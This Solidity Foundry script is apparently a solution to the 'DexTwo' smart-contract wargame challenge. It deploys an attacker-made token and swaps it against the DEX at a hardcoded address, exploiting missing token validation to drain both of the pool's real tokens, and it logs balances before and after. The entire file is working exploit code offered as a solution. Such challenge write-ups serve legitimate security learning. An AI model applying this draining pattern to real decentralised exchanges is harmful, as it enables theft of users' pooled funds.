// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/DexTwo.sol";
import "../src/AttackerToken.sol";

contract DexTwoScript is Script {
    
    address dexTwoAddress = 0x56456228bEb884911fc5f344C5cfb633E087330e;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        DexTwo dexTwo = DexTwo(dexTwoAddress);
        AttackerToken attackerToken = new AttackerToken(dexTwoAddress);
        address token1 = dexTwo.token1(); 
        address token2 = dexTwo.token2(); 
        console2.logAddress(token1);
        console2.logAddress(token2);
        console2.logUint(dexTwo.balanceOf(token1, dexTwoAddress));
        console2.logUint(dexTwo.balanceOf(token2, dexTwoAddress));
        console2.logUint(dexTwo.balanceOf(token1, EOA));
        console2.logUint(dexTwo.balanceOf(token2, EOA));
        dexTwo.approve(dexTwoAddress, 1 ether);
        attackerToken.approve(dexTwoAddress, 1 ether);
        dexTwo.swap(address(attackerToken), token2, 10);
        dexTwo.swap(address(attackerToken), token1, 10);          
        console2.logUint(dexTwo.balanceOf(token1, EOA));
        console2.logUint(dexTwo.balanceOf(token2, EOA));
        console2.logUint(dexTwo.balanceOf(token1, dexTwoAddress));
        console2.logUint(dexTwo.balanceOf(token2, dexTwoAddress));
        vm.stopBroadcast();
    }
}
